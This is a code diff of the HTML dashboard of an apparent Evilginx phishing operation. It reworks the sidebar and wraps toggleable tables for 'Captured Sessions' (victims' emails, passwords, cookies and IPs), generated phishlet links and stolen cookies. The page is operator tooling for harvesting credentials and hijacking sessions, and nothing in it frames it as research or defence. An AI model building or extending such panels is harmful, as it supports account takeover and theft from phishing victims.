@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Dashboard | Evilginx</title>
   <link rel="stylesheet" href="styles.css" />
+  
   <!-- Load Firebase compat SDKs and our scripts -->
   <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
   <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
@@ -13,63 +14,73 @@
 </head>
 <body>
   <div class="sidebar">
-    <!-- "Generate Link" redirects to dashboard2.html for phishlet selection -->
-    <button class="menu-btn" onclick="window.location.href='dashboard2.html'">Generate Link</button>
-    <button class="menu-btn" onclick="viewCapturedSessions()">Captured Sessions</button>
-    <button class="menu-btn" onclick="viewGeneratedLinks()">Generated Links History</button>
-    <button class="menu-btn" onclick="viewCookies()">Cookies</button>
-    <button class="menu-btn" onclick="logout()">Logout</button>
+    <button class="menu-btn" onclick="window.location.href='dashboard2.html'">💼 Generate Link</button>
+    <button class="menu-btn" onclick="toggleTable('capturedSessionsTable')">📂 Captured Sessions</button>
+    <button class="menu-btn" onclick="toggleTable('generatedLinksTable')">🔗 Generated Links</button>
+    <button class="menu-btn" onclick="toggleTable('cookiesTable')">☠️ Cookies</button>
+    <button class="menu-btn" onclick="window.location.href='dashboard3.html'">📜 Drakotech</button>
+    <button class="menu-btn" onclick="logout()">🚪 Logout</button>
   </div>
   
   <div class="content">
     <h2>Dashboard</h2>
     <p>Welcome! Use the sidebar to view captured data.</p>
     
-    <h3>Captured Sessions</h3>
-    <table>
-      <thead>
-        <tr>
-          <th>Email</th>
-          <th>Password</th>
-          <th>Cookies</th>
-          <th>IP</th>
-          <th>Timestamp</th>
-        </tr>
-      </thead>
-      <tbody id="capturedSessions">
-        <!-- Captured sessions will be populated here -->
-      </tbody>
-    </table>
+    <!-- Captured Sessions Table -->
+    <div id="capturedSessionsTable" class="table-container">
+      <h3>📂 Captured Sessions</h3>
+      <table>
+        <thead>
+          <tr>
+            <th>Email</th>
+            <th>Password</th>
+            <th>Cookies</th>
+            <th>IP</th>
+            <th>Timestamp</th>
+          </tr>
+        </thead>
+        <tbody id="capturedSessions">
+          <!-- Captured sessions will be populated here -->
+        </tbody>
+      </table>
+    </div>
     
-    <h3>Generated Links History</h3>
-    <table>
-      <thead>
-        <tr>
-          <th>Phishlet</th>
-          <th>Link</th>
-          <th>Timestamp</th>
-          <th>IP Address</th>
-        </tr>
-      </thead>
-      <tbody id="generatedLinks">
-        <!-- Generated links history will be populated here -->
-      </tbody>
-    </table>
+    <!-- Generated Links Table -->
+    <div id="generatedLinksTable" class="table-container">
+      <h3>🔗 Generated Links History</h3>
+      <table>
+        <thead>
+          <tr>
+            <th>Phishlet</th>
+            <th>Link</th>
+            <th>Timestamp</th>
+            <th>IP Address</th>
+          </tr>
+        </thead>
+        <tbody id="generatedLinks">
+          <!-- Generated links history will be populated here -->
+        </tbody>
+      </table>
+    </div>
     
-    <h3>Cookies</h3>
-    <table>
-      <thead>
-        <tr>
-          <th>Email</th>
-          <th>Cookies</th>
-          <th>Timestamp</th>
-          <th>IP</th>
-        </tr>
-      </thead>
-      <tbody id="cookies">
-        <!-- Captured cookies will be populated here -->
-      </tbody>
-    </table>
+    <!-- Cookies Table -->
+    <div id="cookiesTable" class="table-container">
+      <h3>☠️ Cookies</h3>
+      <table>
+        <thead>
+          <tr>
+            <th>Email</th>
+            <th>Cookies</th>
+            <th>Timestamp</th>
+            <th>IP</th>
+          </tr>
+        </thead>
+        <tbody id="cookies">
+          <!-- Captured cookies will be populated here -->
+        </tbody>
+      </table>
+    </div>
   </div>
 </body>
 </html>
+
